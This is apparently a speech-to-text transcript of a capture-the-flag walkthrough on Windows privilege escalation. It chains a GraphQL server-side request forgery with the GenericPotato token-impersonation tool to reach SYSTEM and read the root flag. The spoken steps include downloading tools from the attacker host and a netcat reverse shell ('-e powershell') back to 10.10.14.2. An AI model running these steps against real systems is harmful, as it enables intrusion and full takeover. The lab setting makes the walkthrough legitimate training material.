connect to us because there's a firewall blocking port 135 outbound so rogue potatoes not going to work here um the next thing we could do is a principler attack but server core by default doesn't have the print spooler so chances are this isn't going to work we can do get service booler and we have to run this with powershell and we're gonna see there's no service with the name spoiler so the default like um rogue potato and sweet potato won't work in this situation so we have sem personate but can't do that the next thing to do is think about how we can um get the server to authenticate back to us because both rogue potato and sweet potato do tricks to make the server authenticate to us so we can steal the token if i go back to this netstat so netstat am we can see there is a service listing on port 8080 but nmap did not see this also we do have winrm but again nmap didn't see it 445 so there is definitely a firewall on this box we can look at what's on port 8080 so let's do sh dash capital l 8080 12701 8080 and let's turn burp suite off so let's see because burp suite is going to listen on this options disable the listener and now we're forwarding that port if i go to 127.001 port 8080 it should go through our proxy and hit that service may take a little bit to go so i'm going to close some windows and we hopefully will get something we got serial system manager and yeah that's about it if i look at the source let's see is there anything interesting nothing really sticks out to me so again let's go back into our inspector let's go to debugger let's go to network first reload the page and we can see where every request is going uh there is a graphql as hitting slash api graphql you can see that here so if we just navigate to that api graphql we get the method doesn't support get i think if we send a post it'll work but if you want to play with graphql things uh i'd highly recommend graphql playground i think that's it is this it graphql playground yep so go to releases and you can download the debian package and then install it with d package dash i but i already have this installed so it probably won't do anything so you can do d package i downloads graphql and run it with sudo and hopefully it says it's already installed ah maybe it's updating the version i don't know exactly what it's doing it should have been installed my box but there we go so we can run now graphql playground and we get this so i'm going to do url endpoint i'm going to say http localhost port 8080 api graphql and click open and if we go to docs or schema we can kind of explore how this graphql thing is set up trying to make the text bigger but i don't know if i can so i'm like hitting control and scrolling up and it's not doing anything i wonder if i can do it here let's see window edit application settings uh let's see is there a font cursor source pro font size 20 save i don't think you changed application settings 20 control s save theme dark save settings okay control s doesn't save but save settings does so now it's a little bigger so where was where'd my document go i may reopen this see this connect there we go docs okay maybe i had to click connect i don't know but we got these queries here we can look at serials and kind of explore how this works so we can write the query by doing like json all serials and then we just hit play on this it's going to give us an error message we must have a sub selection so we can say all serials and then select like id and we get the ids of this but let's select everything so let's do id ingredients name and this would be how you can dump things out of a graphql database so you can see names coco buffs and we got ingredients here but if we go look at all these we can see there is a source url argument here and this will allow us to make http request and this is like a server-side request vulnerability so if we do mutation because this is a mutation so update plant and then plant id this expects a integer is it plant id how do we do this i think it's just colon if it errors we'll play version is float so 1.1 and then source url can be http 1010 14 2. maybe put this in quotes like this and we don't need this anymore so pseudo nc lvmp 80. so we have it making a request back to us so this is where the um application genetic potato comes into play so if i search generic potato github we can find this and we'll have to build it so i'm going to copy this over to my windows machine so let's go here let's go up a few directories get clone download generic potato file open project hopefully we have nothing sensitive in these reapers nope everything looks fine generic potato did i do the right one i think i wanted the sln let's see what happens okay so let's build this rebuild solution and see what error message we get if we have to do anything how this generally works oh i'm building in debug mode probably should build in release um the genetic potato will get a http request direct it over to winram and then ask the client to do ntlm authentication and when it does this ntlm authentication that is where we can steal the token and then use sc impersonate so i wonder if i have to build it on that first i don't remember getting any build errors so i'm trying to build let's just go to release so let's see metadata generic potato nt dll not found build build started it's probably gonna tell me okay succeeded maybe it doesn't build in debug mode now we should be able to build the genetic potato so we can go back to repos generic potato bin release exe so let's set up a smb server so i can copy that quickly so go over here make dirt smb and we can say actually i'll do it here cds and b and then impacted smb server we need to sudo that smb to support user ipsec password ipsec and then the share name i think and then location ipadr we're going to grab my ip 1 230. go back here share i think my username and password was ipsec if it asks ipsec ipsec sweet so now we can just drop the neck potato here and we have to copy it to the server so what i'm going to do go in www uh cp smb drake potato to dub dub dub or to my current directory python3m http server 80. so i can go into program data and then i'm going to wget1010142 genericpotato.exe genericpotato.exe powershell wget cannot be pursed forgot the slash wrong slash so let's just make sure we can execute this and it started but it's doing a named pipe which we don't want we wanted to do a url so i wonder if dash h exists it does so we can do uh method uh program to launch let's see e http it's going to default to 888 on localhost that is fine and it's going to execute a program and arguments so we should before running this copy like netcat or something locate nc64.exe if you don't have it i mean you can just google netcat64 so cp this to www and then we can go back to a w get command nc64 exe we could probably do some powershell one-liner to get it working but i always hate using those powershell one-liners in these type of exploits because it is pretty picky with their like bad characters so i just want to make sure netcat works so 10 10 14 2 80 let's see dash e powershell i think that works it's actually been a while since i've used netcat sudo okay so let's go back to the help of genetic potato so we do drink potato e http dash p program to launch we're gonna do c colon backslash program data nc64.exe and dash a arguments for the program so 10 10 14 2 80 e powershell so let's see if this works it's listening on localhost 8888 so i'm going to go to my graphql i'm going to make a request 127.001.8888. so we're going to send this and it makes request as nt authority system duplicates it and sends it to me if i do who am i we are nt authority slash system so we go users administrator and desktop to grab the root.txt flag so hope you guys enjoyed that take care and i will see you all next week